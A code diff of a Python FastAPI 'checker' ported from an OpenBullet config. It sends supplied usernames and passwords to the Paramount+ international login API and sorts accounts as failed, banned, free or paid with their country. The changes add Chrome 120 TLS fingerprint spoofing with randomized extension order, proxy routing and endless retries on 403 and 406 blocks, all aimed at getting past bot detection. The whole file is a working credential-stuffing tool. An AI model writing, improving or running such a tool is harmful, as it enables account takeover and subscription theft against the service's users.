@@ -2,10 +2,10 @@ import re
 import secrets
 import random
 import urllib.parse
-import time
 from typing import Optional
 
-import requests  # Using standard requests since tls-client.exe acts as the backend handler
+# Switch to the integrated library that doesn't need an external .exe daemon
+import tls_client 
 from fastapi import FastAPI, HTTPException
 from pydantic import BaseModel
 
@@ -99,7 +99,6 @@ def format_proxy(raw_proxy: str) -> str:
     if not raw_proxy:
         return ""
     try:
-        # Matches Openbullet's native string building for credentials + IP:Port combo
         userpass_match = re.search(r"^[^:]+:[^:]+:([^:]+:[^_]+(?:_.+)?)$", raw_proxy)
         ipport_match = re.search(r"^([^:]+:[^:]+)", raw_proxy)
         if userpass_match and ipport_match:
@@ -110,25 +109,16 @@ def format_proxy(raw_proxy: str) -> str:
 
 @app.post("/check")
 def run_check(payload: CheckInput):
-    # var ID = System.Convert.ToHexString(System.Security.Cryptography.RandomNumberGenerator.GetBytes(8)).ToLower();
     device_id = secrets.token_hex(8).lower()
     
-    # proxy handling
-    formatted_prux = ""
+    proxy_url = ""
     if payload.use_proxy and payload.proxy:
-        formatted_prux = format_proxy(payload.proxy)
+        proxy_url = format_proxy(payload.proxy)
 
-    # In your config file, randomUserAgentOutput is called inside the headers block
-    # We provide a fixed baseline mirroring standard iOS configuration headers
-    user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1"
+    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 
-    # Base Headers structured to forward through your tls-client.exe binary pipeline
+    # Base native headers directly targeting the api endpoints
     headers = {
-        "x-tp-h1order": "sec-ch-ua,sec-ch-ua-mobile,sec-ch-ua-platform,upgrade-insecure-requests,user-agent,accept,sec-fetch-site,sec-fetch-mode,sec-fetch-user,sec-fetch-dest,accept-encoding,accept-language",
-        "x-tp-h2order": "auto",
-        "x-tp-h2settings": '{"mode": "auto"}',
-        "x-tp-chid": "HelloIOS_16",
-        "x-tp-proxy": formatted_prux,
         "Host": "www.intl.paramountplus.com",
         "Cookie": "CBS_DEVICEID=",
         "Cache-Control": "max-age=0",
@@ -140,14 +130,15 @@ def run_check(payload: CheckInput):
         "Content-Type": "application/x-www-form-urlencoded"
     }
 
-    # ------------------ #get Block (Login Endpoint) ------------------
+    # Initialize embedded native engine (Mirrors Chrome 120 JA3 fingerprint directly inside Vercel)
+    session = tls_client.Session(client_identifier="chrome_120", random_tls_extension_order=True)
+    session.http2 = True
+
+    # ------------------ #get Block ------------------
     while True:
         try:
-            # Overwriting individual target elements passed as headers to the executable runner
-            headers["x-tp-url"] = "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
-            headers["x-tp-method"] = "POST"
+            url = "https://www.intl.paramountplus.com/apps-api/v2.1/androidphone/auth/login.json?locale=en-us&at=ABC74o%2B31mI%2F%2FzQ3GstOJMJJ%2FgdJGAU5PCKXsJ%2B%2BroG%2FyHi2O754P8Ojsak4Ev7LXck%3D"
             
-            # Form Data matching $"j_username=<input.USER>&j_password=<input.PASS>&deviceId=<ID>"
             login_body = {
                 "j_username": payload.username,
                 "j_password": payload.password,
@@ -155,61 +146,51 @@ def run_check(payload: CheckInput):
             }
             login_body_encoded = urllib.parse.urlencode(login_body)
             
-            # Raw OpenBullet targets http://127.0.0.1:9000 via a standard POST request
-            response = requests.post(
-                "http://127.0.0.1:9000",
+            response = session.post(
+                url,
                 headers=headers,
                 data=login_body_encoded,
-                timeout=120  # timeoutMilliseconds = 120000
+                proxy=proxy_url if proxy_url else None,
+                timeout_seconds=15 # Max timeout on Vercel is 15-64s depending on plan tier
             )
             
-            # IF STRINGKEY @data.RESPONSECODE Contains "500" / "403" / "406" -> JUMP #get
-            if str(response.status_code) in ("500", "403", "406"):
+            if response.status_code in (500, 403, 406):
                 continue
                 
             body = response.text
             break
         except Exception:
-            # Fallback mimicking the infinite execution path on crash loops
-            time.sleep(1)
             continue
 
-    # BLOCK:Keycheck
     if "Invalid username/password pair" in body or '"status":400,"error":"Bad Request",' in body:
         return {"status": "FAIL"}
         
     if "userId" not in body:
         return {"status": "BAN/UNKNOWN"}
 
-    # ------------------ #get2 Block (Status / Plan Details) ------------------
+    # ------------------ #get2 Block ------------------
     while True:
         try:
-            headers["x-tp-url"] = "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
-            headers["x-tp-method"] = "GET"
+            status_url = "https://www.intl.paramountplus.com/apps-api/v3.0/androidphone/login/status.json?locale=en-us&at=ABAe6KaaPmQXoXXr2FS9yDys4wXLwooaEREtz0c6agC7vrQhjTY%2FYfp1dfSDtu9EbB0%3D"
             
-            # Even though it says method = GET inside your second request block, 
-            # Openbullet pushes the packet payload to 127.0.0.1:9000 using POST structure
-            response2 = requests.post(
-                "http://127.0.0.1:9000",
+            response2 = session.get(
+                status_url,
                 headers=headers,
-                data="",
-                timeout=120
+                proxy=proxy_url if proxy_url else None,
+                timeout_seconds=15
             )
             
-            if str(response2.status_code) in ("500", "403", "406"):
+            if response2.status_code in (500, 403, 406):
                 continue
                 
             body2 = response2.text
             break
         except Exception:
-            time.sleep(1)
             continue
 
-    # BLOCK:Keycheck (Custom package assessment)
     if "NEW_FREE_PACKAGE" in body2 or '"planType":null,' in body2:
         return {"status": "FREE/CUSTOM"}
 
-    # BLOCK:Parse & Translate segments mapping
     country_code = parse_lr(body2, '"subscriptionCountry":"', '"')
     
     return {
